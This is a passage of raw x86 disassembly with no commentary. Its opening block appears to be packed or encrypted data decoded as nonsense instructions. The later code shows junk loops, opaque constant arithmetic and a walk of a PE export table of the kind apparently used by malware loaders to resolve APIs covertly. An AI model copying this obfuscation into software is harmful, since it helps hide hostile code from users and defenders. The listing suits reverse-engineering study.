  407f4a:	ins    DWORD PTR es:[edi],dx
  407f4b:	xchg   ebx,eax
  407f4c:	dec    edi
  407f4d:	gs dec ebp
  407f4f:	sub    eax,0x8667519
  407f54:	xor    DWORD PTR [esi+0x4e465d08],ebx
  407f5a:	xchg   edx,eax
  407f5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f5c:	shl    BYTE PTR [edx],cl
  407f5e:	sbb    al,0x5f
  407f60:	xor    DWORD PTR [edx+0x7db4a044],0xfffffff4
  407f67:	mov    bh,0xf3
  407f69:	add    BYTE PTR [eax-0x31],bh
  407f6c:	sub    edi,DWORD PTR ds:0x2457255b
  407f72:	inc    edx
  407f73:	test   eax,0x48464031
  407f78:	rol    BYTE PTR [edx+0x4df03cc4],1
  407f7e:	push   edi
  407f7f:	pop    ss
  407f80:	fcomp  st(0)
  407f82:	out    dx,eax
  407f83:	iret   
  407f84:	stc    
  407f85:	sub    BYTE PTR [eax],0x75
  407f88:	add    DWORD PTR [edx],0xf94cb4e1
  407f8e:	fwait
  407f8f:	sti    
  407f90:	jecxz  0x407fce
  407f92:	jp     0x407f9d
  407f94:	iret   
  407f95:	icebp  
  407f96:	add    eax,0xb6196b5b
  407f9b:	push   edx
  407f9c:	je     0x407f67
  407f9e:	mov    eax,0xbe8b224a
  407fa3:	in     eax,dx
  407fa4:	pop    ss
  407fa5:	jb     0x407fc8
  407fa7:	pop    ebx
  407fa8:	test   al,0xff
  407faa:	loope  0x407f7a
  407fac:	jae    0x40800f
  407fae:	shr    DWORD PTR [ebx+ecx*8-0xd44e454],1
  407fb5:	enter  0xfa7,0x3a
  407fb9:	mov    DWORD PTR [ebp-0x77],esi
  407fbc:	and    eax,0x12f102e7
  407fc1:	ror    DWORD PTR [ebp+0x48],0x38
  407fc5:	ins    BYTE PTR es:[edi],dx
  407fc6:	daa    
  407fc7:	jo     0x407f74
  407fc9:	sbb    al,0x4b
  407fcb:	das    
  407fcc:	lahf   
  407fcd:	fld    TBYTE PTR [edi+0x4a35bdb6]
  407fd3:	dec    ebp
  407fd4:	cmp    DWORD PTR [eax-0x12],edx
  407fd7:	add    BYTE PTR [eax+eax*8-0xe56bb99],ah
  407fde:	and    DWORD PTR [esi+0x2b],edi
  407fe1:	imul   edi,DWORD PTR [eax+edx*2],0x6e060673
  407fe8:	mov    ds:0xb3b9fb0c,al
  407fed:	inc    esi
  407fee:	jl     0x407f86
  407ff0:	(bad)  
  407ff1:	das    
  407ff2:	enter  0x32f1,0x7a
  407ff6:	and    al,0xc3
  407ff8:	ret    
  407ff9:	cmp    DWORD PTR [edx],ebx
  407ffb:	jns    0x407fed
  407ffd:	sub    eax,0xdbef5e32
  408002:	and    esi,ebx
  408004:	lock push es
  408006:	(bad)  
  408007:	out    dx,al
  408008:	sysenter 
  40800a:	push   edi
  40800b:	dec    edi
  40800c:	(bad)  
  40800d:	mov    ebx,0x4490ec70
  408012:	inc    ebp
  408013:	mov    ah,0x7a
  408015:	cmp    eax,0x4f96a8fd
  40801a:	es push ds
  40801c:	repz popf 
  40801e:	cld    
  40801f:	(bad)  
  408020:	mov    bh,0x38
  408022:	xor    DWORD PTR [esi],edi
  408024:	in     eax,0xca
  408026:	push   0x45d9c487
  40802b:	xor    DWORD PTR [esi-0x7709807b],ecx
  408031:	xchg   esp,eax
  408032:	xchg   ebx,eax
  408033:	xor    eax,DWORD PTR [ebx-0x4b]
  408036:	push   edi
  408037:	popf   
  408038:	stos   DWORD PTR es:[edi],eax
  408039:	popf   
  40803a:	cdq    
  40803b:	les    esp,FWORD PTR [edi+edi*1]
  40803e:	or     eax,0xfcda80a6
  408043:	out    0x79,al
  408045:	ficomp WORD PTR [eax]
  408047:	jle    0x407fe1
  408049:	aam    0x8c
  40804b:	outs   dx,BYTE PTR ds:[esi]
  40804c:	into   
  40804d:	pop    eax
  40804e:	cmp    DWORD PTR [esi+0x61],0xfffffff0
  408052:	xor    bh,BYTE PTR [ebx+0x38]
  408055:	fld    st(0)
  408057:	adc    DWORD PTR [edi+eax*8-0x39],ebp
  40805b:	add    BYTE PTR [ebx+0x31],0x69
  40805f:	mov    ecx,0x3d6da897
  408064:	sbb    DWORD PTR [ebp-0x293bf64a],ebp
  40806a:	mov    dl,0x8c
  40806c:	inc    edx
  40806d:	test   eax,0x3591c9af
  408072:	aas    
  408073:	icebp  
  408074:	add    BYTE PTR [esi],al
  408076:	jg     0x407ff9
  408078:	je     0x408041
  40807a:	pop    ds
  40807b:	bound  ebp,QWORD PTR [edx-0x76120bff]
  408081:	not    esp
  408083:	or     ah,0xc9
  408086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408087:	iret   
  408088:	xlat   BYTE PTR ds:[ebx]
  408089:	mov    bl,0xe0
  40808b:	push   edx
  40808c:	and    esp,DWORD PTR [ebx+0x633f5728]
  408092:	push   0xe697357f
  408097:	js     0x4080b8
  408099:	lahf   
  40809a:	or     esp,DWORD PTR [ebx-0x10]
  40809d:	fdiv   st,st(0)
  40809f:	jae    0x408058
  4080a1:	xor    al,0xd5
  4080a3:	jno    0x408060
  4080a5:	or     BYTE PTR ds:0xd1efe4a1,0xaa
  4080ac:	(bad)  
  4080ad:	popa   
  4080ae:	loopne 0x4080a7
  4080b0:	add    ch,BYTE PTR [ecx+0xc49aa7f]
  4080b6:	sub    BYTE PTR [edi],dl
  4080b8:	jg     0x4080c9
  4080ba:	adc    ebx,DWORD PTR [ebx+ecx*8]
  4080bd:	stc    
  4080be:	mov    cl,0x69
  4080c0:	(bad)  
  4080c1:	cmp    al,0x97
  4080c3:	xchg   esi,eax
  4080c4:	and    al,0x2d
  4080c6:	dec    eax
  4080c7:	mov    ecx,0xe44f273f
  4080cc:	imul   esi,DWORD PTR [edi-0x4545ed7a],0xffffffdd
  4080d3:	shl    BYTE PTR [ebx-0x44ed3737],cl
  4080d9:	fisubr WORD PTR [ebx+0x65bf1301]
  4080df:	cmp    al,0x10
  4080e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4080e2:	out    dx,al
  4080e3:	sbb    al,0x22
  4080e5:	xchg   cl,ch
  4080e7:	test   al,0xd1
  4080e9:	mov    ebp,0xed2d7008
  4080ee:	adc    ah,BYTE PTR [esi]
  4080f0:	mov    BYTE PTR [esi],dl
  4080f2:	and    al,0x74
  4080f4:	cmp    dh,dl
  4080f6:	or     DWORD PTR [ebx+0x6b35a4b4],esp
  4080fc:	xor    BYTE PTR [ebx+0x0],bh
  4080ff:	sub    eax,0x89b5ea2b
  408104:	ins    DWORD PTR es:[edi],dx
  408105:	or     ecx,ebp
  408107:	push   es
  408108:	inc    ecx
  408109:	and    DWORD PTR [edi],eax
  40810b:	in     eax,dx
  40810c:	and    DWORD PTR [edi-0x28],0xffffffef
  408110:	mov    WORD PTR [edi+0x43ba4611],?
  408116:	pop    edx
  408117:	into   
  408118:	pop    esp
  408119:	push   ds
  40811a:	mov    edi,0x5b169b82
  40811f:	inc    ecx
  408120:	fs mov edx,0xac3f4a79
  408126:	into   
  408127:	dec    eax
  408128:	repz push 0xe9eddc38
  40812e:	mov    ah,0x49
  408130:	or     eax,0x2507e242
  408135:	sbb    al,0x7f
  408137:	push   ds
  408138:	mov    DWORD PTR [esi+0x41],ecx
  40813b:	ffreep st(2)
  40813d:	aam    0xe9
  40813f:	lds    eax,FWORD PTR [esi]
  408141:	push   cs
  408142:	jo     0x408176
  408144:	fdivr  QWORD PTR [edx-0x4c]
  408147:	mov    esi,DWORD PTR [ebx-0x39]
  40814a:	nop
  40814b:	mov    al,0x5c
  40814d:	mov    ah,0x35
  408150:	mov    al,0x8a
  408152:	fst    QWORD PTR [edx]
  408154:	retf   0xae6c
  408157:	ficomp DWORD PTR [esi-0x4656d58]
  40815d:	rcl    BYTE PTR [ebp-0x11],cl
  408160:	sbb    edx,DWORD PTR [eax+0x1373ab9e]
  408166:	clc    
  408167:	ins    BYTE PTR es:[edi],dx
  408168:	aam    0xa1
  40816a:	cld    
  40816b:	adc    bl,al
  40816d:	mov    ds:0x299281b7,al
  408172:	adc    eax,0xcae70be3
  408177:	xchg   edi,eax
  408178:	xor    al,0x18
  40817a:	or     BYTE PTR [ebp+0x3ac0ee5c],dl
  408180:	sub    ebx,edi
  408182:	jne    0x4081d4
  408184:	dec    esi
  408185:	mov    eax,ds:0x1e0461c9
  40818a:	call   0xcf5bb905
  40818f:	and    eax,0x46a8015
  408194:	push   ebx
  408195:	mov    ebp,0x469832b8
  40819a:	dec    edx
  40819b:	cwde   
  40819c:	xchg   esi,ecx
  40819e:	xor    DWORD PTR ds:0x42801c,edi
  4081a4:	mov    edi,0x155c
  4081a9:	sub    edx,edi
  4081ab:	and    DWORD PTR ds:0x42901c,0x60c1
  4081b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4081b8:	xor    ecx,ebx
  4081ba:	and    DWORD PTR ds:0x42b014,0x0
  4081c4:	mov    esi,DWORD PTR ds:0x42b014
  4081ca:	inc    esi
  4081cb:	mov    DWORD PTR ds:0x42b014,esi
  4081d1:	cmp    DWORD PTR ds:0x42b014,0x10
  4081d8:	jne    0x4081e9
  4081de:	push   0x4234f2
  4081e3:	call   DWORD PTR ds:0x424044
  4081e9:	cmp    DWORD PTR ds:0x42b014,0xf
  4081f0:	jne    0x408203
  4081f6:	mov    esi,DWORD PTR ds:0x42b014
  4081fc:	inc    esi
  4081fd:	mov    DWORD PTR ds:0x42b014,esi
  408203:	cmp    DWORD PTR ds:0x42b014,0x1b
  40820a:	jb     0x4081c4
  408210:	add    ecx,eax
  408212:	sbb    esi,0x766b
  408218:	mov    DWORD PTR [ebp-0x8],ecx
  40821b:	and    esi,0x21f
  408221:	mov    ecx,DWORD PTR [ebp-0x14]
  408224:	mov    DWORD PTR ds:0x42b000,0x19
  40822e:	cmp    DWORD PTR ds:0x42b000,0x0
  408235:	je     0x40828f
  40823b:	cmp    DWORD PTR ds:0x42b000,0x4
  408242:	jne    0x40825b
  408248:	push   DWORD PTR [ebp-0x1c]
  40824b:	push   0x429018
  408250:	push   0x42375e
  408255:	call   DWORD PTR ds:0x424048
  40825b:	cmp    DWORD PTR ds:0x42b000,0x5
  408262:	jne    0x408275
  408268:	mov    esi,DWORD PTR ds:0x42b000
  40826e:	dec    esi
  40826f:	mov    DWORD PTR ds:0x42b000,esi
  408275:	xor    esi,esi
  408277:	add    esi,DWORD PTR ds:0x42b000
  40827d:	dec    esi
  40827e:	mov    DWORD PTR ds:0x42b000,esi
  408284:	jmp    0x40822e
  408289:	and    esi,0x686c
  40828f:	xor    ecx,ebx
  408291:	add    ecx,eax
  408293:	mov    DWORD PTR [ebp-0x24],ecx
  408296:	adc    esi,ecx
  408298:	mov    ecx,DWORD PTR [ebp-0x4]
  40829b:	and    DWORD PTR ds:0x428014,0x0
  4082a5:	jmp    0x4082b7
  4082aa:	mov    esi,DWORD PTR ds:0x428014
  4082b0:	inc    esi
  4082b1:	mov    DWORD PTR ds:0x428014,esi
  4082b7:	cmp    DWORD PTR ds:0x428014,0x14
  4082be:	jae    0x4082ea
  4082c4:	cmp    DWORD PTR ds:0x428014,0x1d
  4082cb:	jne    0x4082df
  4082d1:	push   0x42b01c
  4082d6:	push   DWORD PTR [ebp-0xc]
  4082d9:	call   DWORD PTR ds:0x424014
  4082df:	jmp    0x4082aa
  4082e4:	xor    DWORD PTR ds:0x428018,ecx
  4082ea:	xor    ecx,ebx
  4082ec:	add    ecx,eax
  4082ee:	add    DWORD PTR ds:0x428004,edx
  4082f4:	mov    DWORD PTR [ebp-0x30],ecx
  4082f7:	adc    DWORD PTR ds:0x42b01c,edi
  4082fd:	mov    esi,DWORD PTR [ebp-0x4]
  408300:	xor    DWORD PTR ds:0x42800c,0x2f0f
  40830a:	xor    esi,ebx
  40830c:	and    DWORD PTR ds:0x429018,0x0
  408316:	mov    ecx,DWORD PTR ds:0x429018
  40831c:	inc    ecx
  40831d:	mov    DWORD PTR ds:0x429018,ecx
  408323:	cmp    DWORD PTR ds:0x429018,0x13
  40832a:	jne    0x408358
  408330:	push   DWORD PTR [ebp-0x18]
  408333:	push   0x42b018
  408338:	push   0x8bc1
  40833d:	push   0x42a018
  408342:	push   0x81c2
  408347:	push   DWORD PTR [ebp-0x18]
  40834a:	push   0x8630
  40834f:	push   DWORD PTR [ebp-0x28]
  408352:	call   DWORD PTR ds:0x424018
  408358:	cmp    DWORD PTR ds:0x429018,0x10
  40835f:	jb     0x408316
  408365:	movzx  ecx,WORD PTR ds:0x429008
  40836c:	sub    ecx,DWORD PTR ds:0x42a010
  408372:	mov    DWORD PTR ds:0x429008,ecx
  408378:	add    esi,eax
  40837a:	mov    ecx,DWORD PTR [ebp-0x24]
  40837d:	sub    ecx,eax
  40837f:	lea    edx,[esi-0x3272db]
  408385:	xor    DWORD PTR ds:0x428008,0x428000
  40838f:	xor    ecx,ebx
  408391:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40839b:	xor    edx,ebx
  40839d:	cmp    edx,ecx
  40839f:	mov    DWORD PTR ds:0x428000,0x76f
  4083a9:	je     0x408631
  4083af:	xor    DWORD PTR ds:0x42c010,edx
  4083b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4083b8:	xor    ecx,ebx
  4083ba:	or     DWORD PTR ds:0x429014,0x42a01c
  4083c4:	add    ecx,eax
  4083c6:	cmp    esi,ecx
  4083c8:	mov    DWORD PTR ds:0x42a01c,0x739d
  4083d2:	jne    0x40860e
  4083d8:	add    DWORD PTR ds:0x42a00c,0x429004
  4083e2:	push   DWORD PTR [ebp+0x8]
  4083e5:	call   0x408a39
  4083ea:	mov    DWORD PTR [ebp-0x18],eax
  4083ed:	mov    eax,DWORD PTR [ebp-0x4]
  4083f0:	mov    DWORD PTR ds:0x42c00c,0x1d
  4083fa:	cmp    DWORD PTR ds:0x42c00c,0x0
  408401:	je     0x408435
  408407:	cmp    DWORD PTR ds:0x42c00c,0x21
  40840e:	jne    0x40841d
  408414:	push   DWORD PTR [ebp-0xc]
  408417:	call   DWORD PTR ds:0x42401c
  40841d:	mov    edi,DWORD PTR ds:0x42c00c
  408423:	dec    edi
  408424:	mov    DWORD PTR ds:0x42c00c,edi
  40842a:	jmp    0x4083fa
  40842f:	adc    ecx,DWORD PTR ds:0x428008
  408435:	mov    ecx,DWORD PTR [ebp-0x18]
  408438:	and    DWORD PTR ds:0x42b01c,0x0
  408442:	mov    edi,DWORD PTR ds:0x42b01c
  408448:	inc    edi
  408449:	mov    DWORD PTR ds:0x42b01c,edi
  40844f:	cmp    DWORD PTR ds:0x42b01c,0x23
  408456:	jne    0x408468
  40845c:	push   DWORD PTR [ebp-0x14]
  40845f:	push   DWORD PTR [ebp-0x28]
  408462:	call   DWORD PTR ds:0x424020
  408468:	cmp    DWORD PTR ds:0x42b01c,0x19
  40846f:	jb     0x408442
  408475:	xor    eax,ebx
  408477:	add    DWORD PTR ds:0x429018,0x397c
  408481:	mov    edi,0x3272db
  408486:	sub    DWORD PTR ds:0x428020,0x386b
  408490:	add    eax,edi
  408492:	mov    DWORD PTR ds:0x42900c,0x67dc
  40849c:	cmp    ecx,eax
  40849e:	mov    DWORD PTR ds:0x42c00c,0x661b
  4084a8:	je     0x4086a1
  4084ae:	push   DWORD PTR [ebp-0x18]
  4084b1:	sub    DWORD PTR ds:0x42800c,0x42a014
  4084bb:	push   DWORD PTR [ebp+0x8]
  4084be:	and    DWORD PTR ds:0x42b000,0x429010
  4084c8:	call   0x419246
  4084cd:	sub    ecx,DWORD PTR ds:0x42a00c
  4084d3:	mov    DWORD PTR [ebp-0x18],eax
  4084d6:	xor    eax,eax
  4084d8:	xor    eax,DWORD PTR ds:0x42a01c
  4084de:	xor    DWORD PTR ds:0x428018,eax
  4084e4:	mov    eax,DWORD PTR [ebp-0x4]
  4084e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4084ea:	xor    eax,ebx
  4084ec:	add    eax,edi
  4084ee:	cmp    ecx,eax
  4084f0:	je     0x4086a1
  4084f6:	mov    ecx,DWORD PTR ds:0x429010
  4084fc:	add    DWORD PTR ds:0x42a010,ecx
  408502:	mov    eax,DWORD PTR [ebp-0x18]
  408505:	and    DWORD PTR ds:0x42a008,0x0
  40850f:	jmp    0x408521
  408514:	mov    ecx,DWORD PTR ds:0x42a008
  40851a:	inc    ecx
  40851b:	mov    DWORD PTR ds:0x42a008,ecx
  408521:	cmp    DWORD PTR ds:0x42a008,0x14
  408528:	jae    0x4085ac
  40852e:	cmp    DWORD PTR ds:0x42a008,0x1f
  408535:	jne    0x408563
  40853b:	push   0x42b010
  408540:	push   DWORD PTR [ebp-0x10]
  408543:	push   0x4f72
  408548:	push   0x42900c
  40854d:	push   DWORD PTR [ebp-0x24]
  408550:	push   0x42367e
  408555:	push   DWORD PTR [ebp-0x1c]
  408558:	push   0x3544
  40855d:	call   DWORD PTR ds:0x424024
  408563:	jmp    0x408514
  408568:	and    DWORD PTR ds:0x428020,0x0
  408572:	mov    ecx,DWORD PTR ds:0x428020
  408578:	inc    ecx
  408579:	mov    DWORD PTR ds:0x428020,ecx
  40857f:	cmp    DWORD PTR ds:0x428020,0x1a
  408586:	jne    0x40859f
  40858c:	push   DWORD PTR [ebp-0x1c]
  40858f:	push   0x561b
  408594:	push   0x3276
  408599:	call   DWORD PTR ds:0x424028
  40859f:	cmp    DWORD PTR ds:0x428020,0x17
  4085a6:	jb     0x408572
  4085ac:	mov    eax,DWORD PTR [eax+0x18]
  4085af:	mov    DWORD PTR [ebp-0x24],eax
  4085b2:	xor    eax,eax
  4085b4:	mov    eax,DWORD PTR [ebp-0x18]
  4085b7:	mov    ecx,DWORD PTR [ebp+0x8]
  4085ba:	add    DWORD PTR ds:0x42901c,0x480
  4085c4:	add    ecx,DWORD PTR [eax+0x20]
  4085c7:	mov    DWORD PTR [ebp-0x2c],ecx
  4085ca:	sub    DWORD PTR ds:0x42c00c,ebx
  4085d0:	mov    eax,DWORD PTR [ebp-0x18]
  4085d3:	mov    ecx,DWORD PTR [ebp+0x8]
  4085d6:	add    DWORD PTR ds:0x42a004,0x42a01c
  4085e0:	add    ecx,DWORD PTR [eax+0x24]
  4085e3:	mov    DWORD PTR [ebp-0x34],ecx
  4085e6:	inc    ecx
  4085e7:	mov    eax,DWORD PTR [ebp-0x18]
  4085ea:	sub    DWORD PTR ds:0x42b010,0x20b8
  4085f4:	mov    ecx,DWORD PTR [ebp+0x8]
  4085f7:	or     DWORD PTR ds:0x42a010,0x1874
  408601:	add    ecx,DWORD PTR [eax+0x1c]
  408604:	mov    eax,edi
  408606:	mov    DWORD PTR [ebp-0x18],ecx
  408609:	jmp    0x408669
  40860e:	mov    ecx,DWORD PTR [ebp-0x2c]
  408611:	mov    edx,DWORD PTR [ebp+0x8]
  408614:	add    edx,DWORD PTR [ecx+esi*4]
  408617:	mov    DWORD PTR [ebp-0x28],edx
  40861a:	mov    ecx,DWORD PTR [ebp-0x4]
  40861d:	mov    edx,DWORD PTR [ebp-0x28]
  408620:	xor    ecx,ebx
  408622:	add    ecx,eax
  408624:	cmp    edx,ecx
  408626:	je     0x408669
  40862c:	jmp    0x408655
  408631:	mov    ecx,DWORD PTR [ebp-0x4]
  408634:	mov    edx,DWORD PTR [ebp-0x8]
  408637:	xor    ecx,ebx
  408639:	add    ecx,eax
  40863b:	cmp    edx,ecx
  40863d:	je     0x4086ad
  408643:	mov    ecx,DWORD PTR [ebp-0x4]
  408646:	mov    edx,DWORD PTR [ebp-0x30]
  408649:	xor    ecx,ebx
  40864b:	add    ecx,eax
  40864d:	cmp    edx,ecx
  40864f:	je     0x4086bc
  408655:	lea    eax,[ebp-0x8]
  408658:	push   eax
  408659:	push   DWORD PTR [ebp-0x28]
  40865c:	push   DWORD PTR [ebp+0xc]
  40865f:	call   0x419e00
  408664:	mov    eax,0x3272db
  408669:	mov    ecx,DWORD PTR [ebp-0x4]
  40866c:	mov    edx,DWORD PTR [ebp-0x8]
  40866f:	xor    ecx,ebx
  408671:	add    ecx,eax
  408673:	cmp    edx,ecx
  408675:	je     0x408690
  40867b:	mov    ecx,DWORD PTR [ebp-0x34]
  40867e:	movzx  ecx,WORD PTR [ecx+esi*2]
  408682:	mov    edx,DWORD PTR [ebp-0x18]
  408685:	mov    ecx,DWORD PTR [edx+ecx*4]
  408688:	mov    DWORD PTR [ebp-0x38],ecx
  40868b:	jmp    0x408631
  408690:	mov    ecx,DWORD PTR [ebp-0x14]
  408693:	xor    ecx,ebx
  408695:	lea    esi,[esi+ecx*1+0x3272db]
  40869c:	jmp    0x40837a
  4086a1:	mov    eax,DWORD PTR [ebp-0x4]
  4086a4:	xor    eax,ebx
  4086a6:	add    eax,edi
  4086a8:	jmp    0x408820
  4086ad:	mov    eax,DWORD PTR [ebp-0x4]
  4086b0:	xor    eax,ebx
  4086b2:	add    eax,0x3272db
  4086b7:	jmp    0x408820
  4086bc:	mov    ecx,DWORD PTR [ebp-0x38]
  4086bf:	add    ecx,DWORD PTR [ebp+0x8]
  4086c2:	mov    DWORD PTR [ebp-0x10],ecx
  4086c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4086c8:	test   ecx,ecx
  4086ca:	je     0x4087ab
  4086d0:	mov    DWORD PTR [ebp-0x20],0x0
  4086d7:	push   0x3
  4086d9:	xor    edx,edx
  4086db:	pop    edx
  4086dc:	add    edx,0x8
  4086df:	push   edx
  4086e0:	pop    ecx
  4086e1:	push   0x6
  4086e3:	dec    ecx
  4086e4:	pop    ebx
  4086e5:	dec    ebx
  4086e6:	xchg   ebx,ecx
  4086e8:	sub    ebx,ecx
  4086ea:	xchg   ebx,ecx
  4086ec:	dec    ecx
  4086ed:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f0:	imul   eax,ecx
  4086f3:	sub    esp,eax
  4086f5:	mov    DWORD PTR [ebp-0x20],esp
  4086f8:	mov    eax,DWORD PTR [ebp-0x4]
  4086fb:	mov    ecx,0x7510893
  408700:	xor    eax,ecx
  408702:	mov    edx,0x3272db
  408707:	add    eax,edx
  408709:	mov    DWORD PTR [ebp+0x8],eax
  40870c:	mov    eax,DWORD PTR [ebp-0x14]
  40870f:	xor    eax,ecx
  408711:	add    eax,edx
  408713:	mov    edx,DWORD PTR [ebp+0x14]
  408716:	imul   eax,DWORD PTR [edx]
  408719:	mov    edx,DWORD PTR [ebp-0x4]
  40871c:	xor    edx,ecx
  40871e:	mov    ecx,DWORD PTR [ebp+0x8]
  408721:	lea    ecx,[edx+ecx*1+0x3272db]
  408728:	cmp    ecx,eax
  40872a:	je     0x4087a1
  408730:	mov    edi,DWORD PTR [ebp-0x14]
  408733:	mov    eax,DWORD PTR [ebp+0x8]
  408736:	mov    edx,DWORD PTR [ebp+0x14]
  408739:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40873d:	mov    ecx,0x7510893
  408742:	xor    edx,edx
  408744:	xor    edi,ecx
  408746:	mov    esi,0x3272db
  40874b:	add    edi,esi
  40874d:	div    edi
  40874f:	mov    edx,DWORD PTR [ebp-0x4]
  408752:	xor    edx,ecx
  408754:	lea    eax,[edx+eax*1+0x3272db]
  40875b:	mov    edx,DWORD PTR [ebp+0x8]
  40875e:	mov    edi,DWORD PTR [ebp-0x20]
  408761:	mov    DWORD PTR [edi+edx*4],eax
  408764:	mov    eax,DWORD PTR [ebp-0x14]
  408767:	mov    edx,DWORD PTR [ebp+0x8]
  40876a:	xor    eax,ecx
  40876c:	lea    eax,[eax+edx*1+0x3272db]
  408773:	mov    DWORD PTR [ebp+0x8],eax
  408776:	mov    eax,DWORD PTR [ebp-0x14]
  408779:	mov    edx,DWORD PTR [ebp+0x14]
  40877c:	xor    eax,ecx
  40877e:	add    eax,esi
  408780:	imul   eax,DWORD PTR [edx]
  408783:	mov    edx,DWORD PTR [ebp-0x4]
  408786:	xor    edx,ecx
  408788:	mov    ecx,DWORD PTR [ebp+0x8]
  40878b:	lea    ecx,[edx+ecx*1+0x3272db]
  408792:	cmp    ecx,eax
  408794:	jne    0x408730
  40879a:	mov    eax,esi
  40879c:	jmp    0x4087a6
  4087a1:	mov    eax,0x3272db
  4087a6:	mov    ebx,0x7510893
  4087ab:	mov    ecx,DWORD PTR [ebp-0x4]
  4087ae:	xor    ecx,ebx
  4087b0:	add    ecx,eax
  4087b2:	mov    DWORD PTR [ebp-0xc],ecx
  4087b5:	mov    ebx,0x3874
  4087ba:	add    ebx,0x2342
  4087c0:	xchg   ebx,esi
  4087c2:	xor    ebx,ebx
  4087c4:	push   esi
  4087c5:	mov    esi,ebx
  4087c7:	pop    ebx
  4087c8:	mov    edx,esi
  4087ca:	add    ebx,0x1002
  4087d0:	lea    eax,[ebp-0x10]
  4087d3:	add    edx,eax
  4087d5:	add    edx,0x5
  4087d8:	push   edx
  4087d9:	inc    esi
  4087da:	pop    ecx
  4087db:	dec    ecx
  4087dc:	xchg   ecx,eax
  4087dd:	dec    eax
  4087de:	xchg   ecx,eax
  4087df:	dec    ecx
  4087e0:	xchg   ecx,edx
  4087e2:	dec    edx
  4087e3:	push   edx
  4087e4:	mov    edx,ebx
  4087e6:	pop    ebx
  4087e7:	dec    ebx
  4087e8:	call   DWORD PTR [ebx]
  4087ea:	cmp    DWORD PTR [ebp+0x10],esi
  4087ed:	je     0x40880c
  4087f3:	xchg   edx,eax
  4087f4:	push   0xb
  4087f6:	pop    ecx
  4087f7:	push   0x4
  4087f9:	pop    ebx
  4087fa:	inc    ebx
  4087fb:	xchg   ebx,ecx
  4087fd:	sub    ebx,ecx
  4087ff:	xchg   ebx,ecx
  408801:	dec    ecx
  408802:	dec    ecx
  408803:	mov    eax,DWORD PTR [ebp-0x1c]
  408806:	imul   eax,ecx
  408809:	add    esp,eax
  40880b:	xchg   edx,eax
  40880c:	push   eax
  40880d:	xor    ebx,ebx
  40880f:	mov    edx,esp
  408811:	dec    edx
  408812:	inc    ebx
  408813:	add    ebx,DWORD PTR [edx+ebx*1]
  408816:	dec    ebx
  408817:	xor    edx,edx
  408819:	add    DWORD PTR [ebp-0xc],ebx
  40881c:	pop    ebx
  40881d:	mov    eax,DWORD PTR [ebp-0xc]
  408820:	pop    edi
  408821:	pop    esi
  408822:	pop    ebx
  408823:	leave  
  408824:	ret    0x10
  408827:	or     DWORD PTR ds:0x42c00c,0x42a008
  408831:	xor    eax,eax
  408833:	add    DWORD PTR ds:0x428028,0x42a010
  40883d:	inc    eax
  40883e:	ret    
  40883f:	push   ebp
  408840:	mov    ebp,esp
  408842:	mov    eax,ds:0x421952
  408847:	and    DWORD PTR ds:0x42c008,0x0
  408851:	xor    ecx,ecx
  408853:	or     ecx,DWORD PTR ds:0x42c008
  408859:	inc    ecx
  40885a:	mov    DWORD PTR ds:0x42c008,ecx
  408860:	cmp    DWORD PTR ds:0x42c008,0xc
  408867:	jne    0x40887d
  40886d:	push   0x423556
  408872:	push   0x42350e
  408877:	call   DWORD PTR ds:0x424030
  40887d:	cmp    DWORD PTR ds:0x42c008,0xb
  408884:	jne    0x408897
  40888a:	mov    ecx,DWORD PTR ds:0x42c008
  408890:	inc    ecx
  408891:	mov    DWORD PTR ds:0x42c008,ecx
  408897:	cmp    DWORD PTR ds:0x42c008,0x1b
  40889e:	jb     0x408851
  4088a4:	xor    ecx,DWORD PTR ds:0x42a01c
  4088aa:	mov    eax,DWORD PTR [eax+0x1c8]
  4088b0:	add    ecx,0x4e81
  4088b6:	mov    eax,DWORD PTR [eax]
  4088b8:	and    ecx,DWORD PTR ds:0x42b018
  4088be:	cdq    
  4088bf:	push   ebx
  4088c0:	mov    ecx,0xfabdbef1
  4088c5:	add    ebx,0x1541
  4088cb:	add    eax,ecx
  4088cd:	adc    edx,0xffffffff
  4088d0:	push   esi
  4088d1:	push   edi
  4088d2:	mov    edi,DWORD PTR ds:0x421772
  4088d8:	mov    ebx,DWORD PTR ds:0x42179a
  4088de:	sub    edi,ebx
  4088e0:	or     edi,DWORD PTR [edi+ebx*1]
  4088e3:	mov    edi,edx
  4088e5:	and    DWORD PTR ds:0x429000,0x0
  4088ef:	jmp    0x408901
  4088f4:	mov    edx,DWORD PTR ds:0x429000
  4088fa:	inc    edx
  4088fb:	mov    DWORD PTR ds:0x429000,edx
  408901:	cmp    DWORD PTR ds:0x429000,0x1a
  408908:	jae    0x40895a
  40890e:	cmp    DWORD PTR ds:0x429000,0x7
  408915:	jne    0x40893b
  40891b:	push   DWORD PTR [ebp-0x1c]
  40891e:	push   0x85ec
  408923:	push   0x4f88
  408928:	push   DWORD PTR [ebp-0x10]
  40892b:	push   0x6e2c
  408930:	push   0x428000
  408935:	call   DWORD PTR ds:0x424038
  40893b:	cmp    DWORD PTR ds:0x429000,0x6
  408942:	jne    0x408955
  408948:	mov    edx,DWORD PTR ds:0x429000
  40894e:	inc    edx
  40894f:	mov    DWORD PTR ds:0x429000,edx
  408955:	jmp    0x4088f4
  40895a:	mov    edx,DWORD PTR [ebp+0x8]
  40895d:	adc    DWORD PTR ds:0x42a00c,0x42801c
  408967:	mov    ebx,eax
  408969:	mov    eax,0x8a29a123
  40896e:	xor    esi,esi
  408970:	xor    ebx,eax
  408972:	xor    edi,0x0
  408975:	and    DWORD PTR ds:0x429000,0x1a3f
  40897f:	add    edx,ecx
  408981:	adc    esi,0xffffffff
  408984:	xor    edx,eax
  408986:	xor    esi,0x0
  408989:	cmp    edx,ebx
  40898b:	jne    0x408999
  408991:	cmp    esi,edi
  408993:	je     0x4089c8
  408999:	mov    edx,DWORD PTR ds:0x421952
  40899f:	mov    edx,DWORD PTR [edx+0x1c0]
  4089a5:	mov    edx,DWORD PTR [edx]
  4089a7:	xor    esi,esi
  4089a9:	add    edx,ecx
  4089ab:	adc    esi,0xffffffff
  4089ae:	xor    edx,eax
